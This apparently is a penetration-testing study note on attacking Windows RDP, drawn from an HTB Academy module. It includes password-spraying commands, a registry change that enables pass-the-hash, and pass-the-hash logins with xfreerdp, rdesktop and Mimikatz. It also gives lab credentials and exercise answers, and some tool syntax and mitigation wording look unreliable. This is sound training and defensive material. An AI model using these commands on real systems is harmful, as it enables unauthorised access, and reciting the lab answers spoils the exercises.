# 🛰️ RDP Attack Techniques

## 🔍 Overview of Remote Desktop Protocol (RDP)

[!INFO] The Remote Desktop Protocol (RDP) allows users to connect to and manage Windows operating systems remotely, providing a graphical interface similar to local desktop access.

- **Port**: TCP/3389
- **Authentication**: NTLM or NLA (Network Level Authentication)
- **Key Features**:
  - Session management
  - Clipboard sharing
  - File system redirection

## 🔑 RDP Attack Techniques

### Initial Reconnaissance

[!CHECK] Identify the target IP and verify that TCP/3389 is open using nmap.
```bash
nmap -p 3389 10.129.203.13
```

[!INFO] Use tools like `rdpy` or `rdesktop` to probe the target for additional information.
```bash
rdpy -h 10.129.203.13 --user=hacker --password=test
```

### Brute-Force Attacks

#### Dictionary-Based Password Spraying

[!CHECK] Attempt password spraying with common credentials using `crowbar`.
```bash
# Using crowbar for brute-forcing RDP connections
crowbar -b rdp -u administrator -p passwords.txt 10.129.203.13
```

#### Password Spraying Against All Users

[!CHECK] Use a more exhaustive approach by attempting password spraying against all user accounts.
```bash
# Brute-forcing with wordlist using crowbar
crowbar -b rdp -p passwords.txt 10.129.203.13
```

### Pass-the-Hash (PtH) Attacks

#### Preparing for PtH Attack

[!NOTE] Ensure that the target machine has "Restricted Admin Mode" disabled to allow NTLM authentication.
```cmd
# Modify registry key to disable Restricted Admin Mode
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

# Verify modification
reg query HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin
```

#### Execute Pass-the-Hash Attack

[!SUCCESS] Use `xfreerdp` or similar tools to authenticate using NT hashes.
```bash
# Using xfreerdp for Pass-the-Hash attack
xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9

# Output should indicate a successful connection
```

#### Alternative PtH Tools

[!INFO] Utilize `rdesktop` or Mimikatz for Pass-the-Hash attacks.
```bash
# Using rdesktop with hash
rdesktop -u lewen -p "" -d domain --hash 300FF5E89EF33F83A8146C10F5AB9BB9 192.168.220.152

# Using Mimikatz for Pass-the-Hash attack
sekurlsa::pth /user:lewen /domain:corp /ntlm:300FF5E89EF33F83A8146C10F5AB9BB9 /run:"mstsc /v:192.168.220.152"
```

---

## 🎯 HTB Academy Lab Scenarios

### Scenario 1: Initial RDP Access
```bash
# Target: 10.129.203.13 (ACADEMY-ATTCOMSVC-WIN-01)
# Credentials: htb-rdp:HTBRocks!

# Connect using provided credentials
rdesktop -u htb-rdp -p HTBRocks! 10.129.203.13

# Task: Find file on Desktop
# Answer: pentest-notes.txt
```

### Scenario 2: Registry Key Knowledge
```cmd
# Question: Which registry key needs to be changed to allow Pass-the-Hash with RDP?
# Answer: DisableRestrictedAdmin

# Registry path: HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa
# Value: DisableRestrictedAdmin (REG_DWORD) = 0x0
```

### Scenario 3: Administrator Access
```bash
# Task: Connect via RDP with Administrator account and find flag.txt

# Potential attack vectors:
# 1. Password spraying against Administrator account
crowbar -b rdp -s 10.129.203.13 -u administrator -C passwords.txt

# 2. Pass-the-Hash if NT hash is available
xfreerdp /v:10.129.203.13 /u:administrator /pth:HASH_VALUE

# 3. Session hijacking if another admin is logged in
# Look for flag.txt in common locations:
# - C:\flag.txt
# - C:\Users\Administrator\Desktop\flag.txt
# - C:\Users\Administrator\Documents\flag.txt
```

---

## 📋 RDP Attack Checklist

### Discovery & Enumeration
- [ ] **Port scanning** - TCP/3389 detection
- [ ] **Version enumeration** - Windows version identification
- [ ] **Certificate analysis** - Self-signed vs CA certificates
- [ ] **Domain membership** - Standalone vs domain-joined

### Authentication Attacks
- [ ] **Default credentials** - administrator:password, admin:admin
- [ ] **Password spraying** - Single password, multiple users
- [ ] **Common passwords** - Spring2024!, Password123, company name
- [ ] **Seasonal passwords** - Current year/month variations

### Post-Authentication
- [ ] **Session enumeration** - Active RDP sessions
- [ ] **User privilege checking** - Local admin rights
- [ ] **Session hijacking** - Target high-privilege users
- [ ] **Hash dumping** - Extract NT hashes for PtH

### Advanced Techniques
- [ ] **Pass-the-Hash** - Registry modification required
- [ ] **Kerberoasting** - Service account targeting
- [ ] **Golden/Silver tickets** - Kerberos ticket attacks
- [ ] **Lateral movement** - RDP to other systems

---

## 🛡️ Defense & Mitigation

### RDP Security Hardening
- **Network Level Authentication (NLA)** - Enable for all RDP connections
- **Strong password policies** - Prevent common password usage
- **Account lockout policies** - Limit failed login attempts
- **IP restrictions** - Whitelist authorized source IPs
- **Non-standard ports** - Change from default 3389
- **VPN requirements** - Require VPN for RDP access

### Registry Security
- **Disable Restricted Admin** - Prevent Pass-the-Hash attacks
- **Audit registry changes** - Monitor security-related modifications
- **Group Policy controls** - Centralized RDP security settings

### Monitoring & Detection
- **Failed authentication logs** - Event ID 4625 monitoring
- **Successful RDP logins** - Event ID 4624 tracking
- **Session creation/termination** - Event ID 4778/4779
- **Unusual source IPs** - Geographic/time-based anomalies
- **Registry modifications** - Monitor Lsa registry changes

---

## 🔗 Related Techniques

- [[SMB Attacks]] - Credential extraction for RDP PtH
- [[SQL Attacks]] - Database access for credential discovery
- [[Pass the Hash]] - NT hash exploitation
- [[Active Directory Attacks]] - Domain privilege escalation
- [[Kerberoasting]] - Service account attacks

---

## 📚 References

- **HTB Academy** - Attacking Common Services Module
- **Microsoft RDP Documentation** - Official protocol specifications
- **Crowbar Tool** - RDP password spraying utility
- **FreeRDP Project** - Open-source RDP implementation
- **NIST Guidelines** - Remote access security best practices

---

*This document provides comprehensive RDP attack methodologies based on HTB Academy's "Attacking Common Services" module, focusing on practical exploitation techniques for penetration testing and security assessment.*